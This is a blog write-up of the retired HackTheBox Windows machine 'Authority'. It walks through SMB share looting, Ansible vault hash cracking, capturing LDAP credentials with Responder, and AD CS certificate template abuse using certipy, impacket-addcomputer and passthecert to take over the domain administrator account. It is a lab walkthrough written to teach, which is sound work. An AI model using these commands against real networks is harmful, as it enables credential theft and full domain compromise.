---
title: "Authority HackTheBox"
layout: post
date: 2023-12-09 12:00
tag: 
- HackTheBox
- Pentesting
- Authority
- Windows
- Meduim
- Active Directory
- Ansible
- AD CS
image: https://www.hackthebox.com/storage/avatars/e6257bbacb2ddd56f5703bb61eadd8cb.png
headerImage: true
writeups: true
hidden: true # don't count this post in blog pagination
description: "An easy retired HackTheBox machine."
category: project
author: johndoe
externalLink: false
star: false
---

# Overview

Authority is a meduim HackTheBox windows machine where we used some decrypted ansible hashes that were exposed in a SMB share to login via the Configuration Manager endpoint. Here we can upload a configuration file and set our Responder to craft any sent plaintext data via LDAP server. The privilege escalation is about exploiting a vulnerable certificate and then compromize the Administrator's account.

---

# Nmap

```bash
nmap -A -T4 10.10.11.222     
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-06 20:46 +01
Nmap scan report for 10.10.11.222
Host is up (0.15s latency).
Not shown: 987 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-06 23:46:49Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-11-06T23:47:43+00:00; +3h59m56s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2023-11-06T23:47:43+00:00; +3h59m55s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-11-06T23:47:43+00:00; +3h59m56s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-11-06T23:47:42+00:00; +3h59m56s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
8443/tcp open  ssl/https-alt
| ssl-cert: Subject: commonName=172.16.2.118
| Not valid before: 2023-11-04T03:19:51
|_Not valid after:  2025-11-05T14:58:15
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesnt have a title (text/html;charset=ISO-8859-1).
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Mon, 06 Nov 2023 23:46:56 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Mon, 06 Nov 2023 23:46:55 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, OPTIONS
|     Content-Length: 0
|     Date: Mon, 06 Nov 2023 23:46:55 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1936
|     Date: Mon, 06 Nov 2023 23:47:02 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol [RTSP&#47;1.00x0d0x0a0x0d0x0a...]</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.94%T=SSL%I=7%D=11/6%Time=654942B3%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,DB,HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;c
SF:harset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Mon,\x2006\x20No
SF:v\x202023\x2023:46:55\x20GMT\r\nConnection:\x20close\r\n\r\n\n\n\n\n\n<
SF:html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;URL='/pwm'\"/
SF:></head></html>")%r(HTTPOptions,7D,"HTTP/1\.1\x20200\x20\r\nAllow:\x20G
SF:ET,\x20HEAD,\x20POST,\x20OPTIONS\r\nContent-Length:\x200\r\nDate:\x20Mo
SF:n,\x2006\x20Nov\x202023\x2023:46:55\x20GMT\r\nConnection:\x20close\r\n\
SF:r\n")%r(FourOhFourRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20
SF:text/html;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Mon,\
SF:x2006\x20Nov\x202023\x2023:46:56\x20GMT\r\nConnection:\x20close\r\n\r\n
SF:\n\n\n\n\n<html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;UR
SF:L='/pwm'\"/></head></html>")%r(RTSPRequest,82C,"HTTP/1\.1\x20400\x20\r\
SF:nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\r\
SF:nContent-Length:\x201936\r\nDate:\x20Mon,\x2006\x20Nov\x202023\x2023:47
SF::02\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\x20la
SF:ng=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20
SF:Request</title><style\x20type=\"text/css\">body\x20{font-family:Tahoma,
SF:Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;background
SF:-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}\
SF:x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:bla
SF:ck;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}</s
SF:tyle></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20R
SF:equest</h1><hr\x20class=\"line\"\x20/><p><b>Type</b>\x20Exception\x20Re
SF:port</p><p><b>Message</b>\x20Invalid\x20character\x20found\x20in\x20the
SF:\x20HTTP\x20protocol\x20\[RTSP&#47;1\.00x0d0x0a0x0d0x0a\.\.\.\]</p><p><
SF:b>Description</b>\x20The\x20server\x20cannot\x20or\x20will\x20not\x20pr
SF:ocess\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x20perc
SF:eived\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malformed\x20
SF:request\x20syntax,\x20invalid\x20);
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-11-06T23:47:37
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 3h59m55s, deviation: 0s, median: 3h59m55s
```

First I enumerated available smb shares :

```bash
smbclient -L 10.10.11.222
Password for [WORKGROUP\elliot]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Department Shares Disk      
        Development     Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share
```

I checked the content of the Development share :

```bash
smbclient //10.10.11.222/Development
```

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231107010404.png>)

It contains a lot of folders so I decided to dump all the directories inside that share :

```bash
RECURSE ON
PROMPT OFF
mget *
```

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231106213236.png>)

I said maybe I can found some useful creds using grep, And I found them, so now I should find where to login with those creds :

```bash
grep -ir "password"
```

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231106213945.png>)

The web page at port 80 is the default IIS page :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231106212905.png>)

And the web page at port 8443 running the Password Self Service, I used the found creds but they're not working :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231106213757.png>)

After turning around, I went back to dig deeper in the folders I dumped before, I found a yml file in *PWM/defaults/main.yml* which contains ansible vault hashes, I had no idea what's that about so I googled it and found some useful information :

[https://docs.ansible.com/ansible/latest/vault_guide/vault_encrypting_content.html](https://docs.ansible.com/ansible/latest/vault_guide/vault_encrypting_content.html)
[https://stackoverflow.com/questions/43467180/how-to-decrypt-string-with-ansible-vault-2-3-0](https://stackoverflow.com/questions/43467180/how-to-decrypt-string-with-ansible-vault-2-3-0)

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231106215651.png>)

Following the steps described in the blog above, I successfully decrypted those hashes :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231106224925.png>)

```bash
ansible2john vault1.yml > vault1.hash
```

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231106224733.png>)

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231106224747.png>)

I cracked all the vault hashes found but they give me the same vault password.

```bash
cat vault1.yml | ansible-vault decrypt
cat vault2.yml | ansible-vault decrypt
cat vault3.yml | ansible-vault decrypt
```

Now I have the decrypted hashes so I can login to the Password Self Service :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231106230720.png>)

I tried to login with username and password found but didn't work again, so I tried to login via Configuration Manager and it worked ! 

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231106231144.png>)

Upon further analysis, we discovered that we can download the PWM configuration and also import a configuration file. Therefore, we came up with the idea of using Responder to emulate an LDAP server and observe what information it sends us. Perhaps we will be lucky and obtain a password :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231106231228.png>)

I downloaded the config file :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231106231738.png>)

It is necessary to modify the LDAP address in the configuration and replace the IP address with my IP address since Responder does not support LDAPS service :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231106232130.png>)

So I run Responder with the hope to capture some passwords :

```bash
sudo responder -I tun0
```

Then I imported the modified config file :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231106232214.png>)

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231106232300.png>)

AND BOOM I got a password :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231106232347.png>)

I tested if I can login via WinRM and YES I CAN :

```bash
crackmapexec winrm 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
```

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231106232540.png>)

# User flag

Now I can read the user flag :

```bash
evil-winrm -i 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
```

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231106232656.png>)

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231106232748.png>)

# PE

After checking the privileges and running **Winpeas** which was a dead end, I remembered the machine name (Authority) and said maybe there is something with the certificates, so I run certify to find vulnerable templates and yes I found that CorpVPN is vulnerable :

```bash
./Certify.exe find /vulnerable
```

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231106235155.png>)

<p>Since there is no Domain User in Enrollment Rights, we are unable to request a certificate directly.</p>
<p>But we see that computers that are in the Domain Computers group are able to request a certificate!</p>
Checking our privileges we see that we can actually add a machine to the domain, so creating this new machine in the Domain Computers will make us able to request a certificate :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231107001251.png>)

We can add a new machine to our Domain Computer using the Impacket's addcomputer tool :

```bash
impacket-addcomputer authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!' -computer-name ELLIOT$ -computer-pass 'Password1'
```

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231107002555.png>)

And now we can request a certificate using our newly created computer account :

```bash
certipy-ad req -u 'ELLIOT$' -p 'Password1' -ca AUTHORITY-CA -target authority.htb -template CorpVPN -upn administrator@authority.htb -dns authority.authority.htb -dc-ip 10.10.11.222
```

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231107002535.png>)

I tried to authenticate with certipy using the generated administrator pfx file but I couldn't so I had to change the method to Authenticate via LDAP instead of Kerberos using a tool called **PassTheCert**.

[https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate)
[https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-certificate-services](https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-certificate-services)
[https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231107004634.png>)

```bash
certipy-ad cert -pfx administrator_authority.pfx -nokey -out user.crt
certipy-ad cert -pfx administrator_authority.pfx -nocert -out user.key
```

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231107002827.png>)

- 1st way :

We can add our user to the Administrators group and BOOM we compromised the machine :

```bash
python3 passthecert.py -action ldap-shell -crt user.crt -key user.key -domain authority.htb -dc-ip 10.10.11.222

add_user_to_group svc_ldap Administrators
```

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231107003103.png>)

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231107003049.png>)

- 2nd way :

We can change the Administrator password to whatever we want and the login via WinRM :

```bash
python3 passthecert.py -action modify_user -crt user.crt -key user.key -domain authority.htb -dc-ip 10.10.11.222 -target administrator -new-pass H4ck3d!
```

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231107003835.png>)

```bash
evil-winrm -i 10.10.11.222 -u administrator -p 'H4ck3d!'
```

Voilà I'm in as Administrator :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231107003923.png>)

Now we can read the root flag :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231107003736.png>)

<br/>

# MACHINE PWNED!

<br/>

And that was it, I hope you enjoyed the writeup. If you have any questions you can [Contact Me](https://www.linkedin.com/in/hichamouardi).

<p>Happy Hacking!</p>